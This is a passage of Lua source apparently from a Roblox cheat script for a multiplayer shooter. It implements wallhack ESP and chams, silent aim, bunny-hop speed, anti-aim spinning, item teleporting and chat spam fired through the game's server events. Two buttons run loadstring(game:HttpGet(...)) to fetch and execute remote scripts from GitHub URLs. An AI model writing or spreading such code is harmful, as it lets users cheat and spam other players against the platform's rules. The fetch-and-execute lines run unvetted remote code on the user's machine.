				if v==tofind then
					found = true
					break;
				end
			end
			return found
		end
	
		TweenStatus = nil
	
		local TweenService = game:GetService("TweenService")
		TweenCFrame = Instance.new("CFrameValue")
	
	
		function tweenstuff(partpos)
			TweenStatus = true
			TweenCFrame.Value = workspace.CurrentCamera.CFrame
			local tweenframe = TweenService:Create(TweenCFrame, TweenInfo.new(0.2),{Value = CFrame.new(workspace.CurrentCamera.CFrame.Position, partpos)})
			tweenframe:Play()
			tweenframe.Completed:Wait()
			TweenStatus = nil
			TweenCFrame.Value = CFrame.new(0,0,0)
		end
	
	
		while true do
	
	
			if Movement_Toggled then
	
				if Bhop_Toggled then
					if userInputService:IsKeyDown(Enum.KeyCode.Space) then
						if LP.Character then
							LP.Character['Humanoid'].Jump = true
							LP.Character['Humanoid'].WalkSpeed =  Bhop_Speed
						end
					end
				end
			end
	
	
			if Visuals_Toggled then
	
				if NameTags_Toggled then
					if Teamcheck_Toggled then
						for I,V in pairs (game.Players:GetPlayers()) do
							if V ~= LP then
								if V.TeamColor ~= LP.TeamColor then
									if V.Character and V.Character:FindFirstChild("Head") then
										if V.Character.Head:FindFirstChild("TotallyNotNAMEESP") then
											V.Character.Head['TotallyNotNAMEESP'].TextLabel.TextColor3 = ChamsColor
										else
											local bbgui = Instance.new("BillboardGui",  V.Character['Head'])
											bbgui.Name = "TotallyNotNAMEESP"
											bbgui.AlwaysOnTop = true
											bbgui.StudsOffset = Vector3.new(0, 2, 0)
											bbgui.ClipsDescendants = false
											bbgui.Enabled = true
											bbgui.Size = UDim2.new(0, 200,0, 50)
	
											local boxha = Instance.new('TextLabel', bbgui)
											boxha.Size = UDim2.new(0, 200,0, 50)
											boxha.TextColor3 = ChamsColor
											boxha.Text = V.Name
											boxha.Font = Enum.Font.Code
											boxha.TextSize = 20
											boxha.BackgroundTransparency = 1
											boxha.BorderSizePixel = 0
											boxha.Visible = true
											boxha.Size = UDim2.new(0, 200,0, 50)
											boxha.TextWrapped = true
										end
									end
								elseif V.TeamColor == LP.TeamColor then
									if V.Character and V.Character:FindFirstChild("Head") then
										if V.Character.Head:FindFirstChild("TotallyNotNAMEESP") then
											V.Character.Head['TotallyNotNAMEESP']:Destroy()
										end
									end
								end
							end
						end
					else
						for I,V in pairs (game.Players:GetPlayers()) do
							if V ~= LP then
								if V.Character and V.Character:FindFirstChild("Head") then
									if V.Character.Head:FindFirstChild("TotallyNotNAMEESP") then
										V.Character.Head['TotallyNotNAMEESP'].TextLabel.TextColor3 = ChamsColor
									else
										local bbgui = Instance.new("BillboardGui",  V.Character['Head'])
										bbgui.Name = "TotallyNotNAMEESP"
										bbgui.AlwaysOnTop = true
										bbgui.StudsOffset = Vector3.new(0, 2, 0)
										bbgui.ClipsDescendants = false
										bbgui.Enabled = true
										bbgui.Size = UDim2.new(0, 200,0, 50)
										local boxha = Instance.new('TextLabel', bbgui)
										boxha.Size = UDim2.new(0, 200,0, 50)
										boxha.TextColor3 = ChamsColor
										boxha.Text = V.Name
										boxha.Font = Enum.Font.Code
										boxha.TextSize = 20
										boxha.BackgroundTransparency = 1
										boxha.BorderSizePixel = 0
										boxha.Visible = true
										boxha.Size = UDim2.new(0, 200,0, 50)
										boxha.TextWrapped = true
									end
								end
							end
						end
					end
				end
				if Chams_Toggled then
					if Teamcheck_Toggled then
						for I,V in pairs (game.Players:GetPlayers()) do
							if V ~= LP then
								if V.TeamColor ~= LP.TeamColor then
									if V.Character then
										for X,Z in pairs(V.Character:GetChildren()) do
											if Z.ClassName == 'MeshPart' or Z.ClassName == 'Part' and isInTable(BodyParts, Z.Name) then
												if Z:FindFirstChild("TotallyNotESP") then
													Z['TotallyNotESP'].Color3 = ChamsColor
												else
													if Z.Name == 'Head' then
														local headha = Instance.new("CylinderHandleAdornment",Z)
														headha.Adornee = Z
														headha.Transparency = 0
														headha.AlwaysOnTop = true
														headha.Name = "TotallyNotESP"
														headha.ZIndex = 1
														headha.Color3 = ChamsColor
														headha.Height = 1.3
													else
														local boxha = Instance.new("BoxHandleAdornment",Z)
														boxha.Adornee = Z
														boxha.Transparency = 0
														boxha.AlwaysOnTop = true
														boxha.Name = "TotallyNotESP"
														boxha.Size = Z.Size
														boxha.ZIndex = 1
														boxha.Color3 = ChamsColor
													end
												end
											end
										end
									end
								elseif V.TeamColor == LP.TeamColor then
									if V.Character then
										for X,Z in pairs(V.Character:GetChildren()) do
											if Z.ClassName == 'MeshPart' or Z.ClassName == 'Part' and isInTable(BodyParts, Z.Name) then
												if Z:FindFirstChild("TotallyNotESP") then
													Z['TotallyNotESP']:Destroy()
												end
											end
										end
									end
								end
							end
						end
					else
						for I,V in pairs (game.Players:GetPlayers()) do
							if V ~= LP then
								if V.Character then
									for X,Z in pairs(V.Character:GetChildren()) do
										if Z.ClassName == 'MeshPart' or Z.ClassName == 'Part' and isInTable(BodyParts, Z.Name) then
											if Z:FindFirstChild("TotallyNotESP") then
												Z['TotallyNotESP'].Color3 = ChamsColor
											else
												if Z.Name == 'Head' then
													local headha = Instance.new("CylinderHandleAdornment",Z)
													headha.Adornee = Z
													headha.Transparency = 0
													headha.AlwaysOnTop = true
													headha.Name = "TotallyNotESP"
													headha.ZIndex = 1
													headha.Color3 = ChamsColor
													headha.Height = 1.3
												else
													local boxha = Instance.new("BoxHandleAdornment",Z)
													boxha.Adornee = Z
													boxha.Transparency = 0
													boxha.AlwaysOnTop = true
													boxha.Name = "TotallyNotESP"
													boxha.Size = Z.Size
													boxha.ZIndex = 1
													boxha.Color3 = ChamsColor
												end
											end
										end
									end
								end
							end
						end
					end
				end
			end
	
	
			if Chatspam_Toggled then
				if not ChatDebounce then
					spawn(function()
						ChatDebounce = true
						while ChatDebounce do
							if Chatspam_Type == 'HAMEWARE' then
								game.ReplicatedStorage.Events.PlayerChatted:FireServer(HAMEWARE_Chatspam[math.random(1, #HAMEWARE_Chatspam)], false, false, false, true)
							elseif Chatspam_Type == 'Furry' then
								game.ReplicatedStorage.Events.PlayerChatted:FireServer(Furry_Chatspam[math.random(1, #Furry_Chatspam)], false, false, false, true)
							elseif Chatspam_Type == 'Swiss' then
								game.ReplicatedStorage.Events.PlayerChatted:FireServer(Swiss_Chatspam[math.random(1, #Swiss_Chatspam)], false, false, false, true)
							elseif Chatspam_Type == 'HvH' then
								game.ReplicatedStorage.Events.PlayerChatted:FireServer(HvH_Chatspam[math.random(1, #HvH_Chatspam)], false, false, false, true)
							elseif Chatspam_Type == 'China' then
								game.ReplicatedStorage.Events.PlayerChatted:FireServer(China_Chatspam[math.random(1, #China_Chatspam)], false, false, false, true)
							end
							wait(Chatspam_Wait)
							if not Chatspam_Toggled then
								ChatDebounce = false
								break
							end
						end
					end)
				end
			end
	
			if AntiAim_Toggle then
				if Yaw_Type == "Custom" then
					characterrotate(CFrame.new(CustomYaw_Value, 0, 0))
				elseif Yaw_Type == "Jitter" then
					if game.Players.LocalPlayer.Character then
						game.Players.LocalPlayer.Character:WaitForChild("Humanoid").AutoRotate = false
						local spin = Instance.new('BodyAngularVelocity', game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart'))
						spin.AngularVelocity = Vector3.new(0, math.random(-60000, 55000), 0)
						spin.MaxTorque = Vector3.new(0, 35000, 0)
						wait()
						spin:Destroy()
					end
				elseif Yaw_Type == "Spin" then
					if game.Players.LocalPlayer.Character then
						game.Players.LocalPlayer.Character:WaitForChild("Humanoid").AutoRotate = false
						local spin = Instance.new('BodyAngularVelocity', game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart'))
						spin.AngularVelocity = Vector3.new(0, AntiAim_Speed * 100, 0)
						spin.MaxTorque = Vector3.new(0, 23000, 0)
						wait()
						spin:Destroy()
					end
				elseif Yaw_Type == "Back" then
					characterrotate((workspace.CurrentCamera.CFrame * backrotation).p)
				end
			end
	
			if isthirdperson then
				userInputService.MouseBehavior = Enum.MouseBehavior.LockCenter  
				LP.CameraMode = 'Classic'
				game.Players.LocalPlayer.CameraMaxZoomDistance = 12
				game.Players.LocalPlayer.CameraMinZoomDistance = 12
			else
				LP.CameraMode = 'LockFirstPerson'
				game.Players.LocalPlayer.CameraMaxZoomDistance = 0
				game.Players.LocalPlayer.CameraMinZoomDistance = 0
			end
	
			if CollectDebris then
				for i,v in pairs(debris:GetChildren()) do
					if v.Name == "DeadHP" or v.Name == "DeadAmmo" then
						v.CFrame = LP.Character.HumanoidRootPart.CFrame * CFrame.new(0,0.2,0)
					end
				end
			end
	
	
			if SilentAim_Toggled then
	
				local xd = math.random(0, 100);
				if (silentaim_headhitchance or 0) <= xd then
					bodyname = 'UpperTorso'
				elseif (silentaim_bodyhitchance or 0) >= xd then
					bodyname = 'Head'
				else
					bodyname = 'Head'
				end
				local yeet = GetTarget()
				if yeet then
					target = yeet
				else
					target = hed
				end
	
				if Show_SILENTAIMFOV then
					circle.Visible = true
					circle.Thickness = SilentAimFOV_Thickness
					circle.NumSides = SilentAimFOV_Numsides
					circle.Radius = SilentAim_FOV
					circle.Filled = SilentAimFOV_Filled
					circle.Position = defaultvector
					circle.Color = SilentAimFOV_Color
					circle.Transparency = SilentAimFOV_Transparency / 100
				else
					circle.Visible = false
				end
	
			end
	
	
			if ArmChams then
				if not workspace.Camera:FindFirstChild("Arms") then
					wait()
				else
					for i,v in pairs(workspace.Camera.Arms:GetDescendants()) do
						if v.Name == 'Right Arm' or v.Name == 'Left Arm' then
							if v:IsA("BasePart") then
								v.Material = Enum.Material[ArmMaterial]
								v.Color = ArmChams_Color
							end
						elseif v:IsA("SpecialMesh") then
							if v.TextureId == '' then
								v.TextureId = 'rbxassetid://0'
								v.VertexColor = convert_rgb_to_vertex(ArmChams_Color)
							end
						elseif v.Name == 'L' or v.Name == 'R' then
							v:Destroy()
						end
					end
				end
			end
	
			if WeaponChams then
				if not workspace.Camera:FindFirstChild("Arms") then
					wait()
				else
					for i,v in pairs(workspace.Camera.Arms:GetDescendants()) do
						if v:IsA("MeshPart") then
							v.Material = Enum.Material[WeaponMaterial]
							v.Color = WeaponChams_Color
						end
					end
				end
			end
	
	
			game:GetService("RunService").RenderStepped:Wait()
	
		end
	end)
end
coroutine.wrap(OQNSCJF_fake_script)()
local function CADX_fake_script() -- AM.Script 
	local script = Instance.new('Script', AM)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JusticeValley/Antarctic-Hub/main/New.lua", true))()
	end)
end
coroutine.wrap(CADX_fake_script)()
local function HGZB_fake_script() -- TTD.Script 
	local script = Instance.new('Script', TTD)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Tower/main/Toilet"))()
	end)
end
coroutine.wrap(HGZB_fake_script)()
local function WSORW_fake_script() -- TextButton_2.Script 
	local script = Instance.new('Script', TextButton_2)

	local ch = script.Parent.Parent
	
	script.Parent.MouseButton1Click:Connect(function()
		ch.Visible = false
	end)
end
coroutine.wrap(WSORW_fake_script)()
local function TSKTGTF_fake_script() -- TextButton_3.Script 
	local script = Instance.new('Script', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		local AYS = script.Parent.Parent.AreYouSure
		AYS.Visible = true
	end)
end
coroutine.wrap(TSKTGTF_fake_script)()
local function MVGDY_fake_script() -- Y.LocalScript 
	local script = Instance.new('LocalScript', Y)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(MVGDY_fake_script)()
local function QRNP_fake_script() -- N.LocalScript 
	local script = Instance.new('LocalScript', N)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(QRNP_fake_script)()
local function GTXOJZV_fake_script() -- Frame_2.IsGameLoaded? 
	local script = Instance.new('Script', Frame_2)

	wait(1)
	local loaded = game.Loaded
	if not loaded then
		script.Parent.Visible = true
	else if loaded then
			script.Parent.Visible = false
		end
	end
end
coroutine.wrap(GTXOJZV_fake_script)()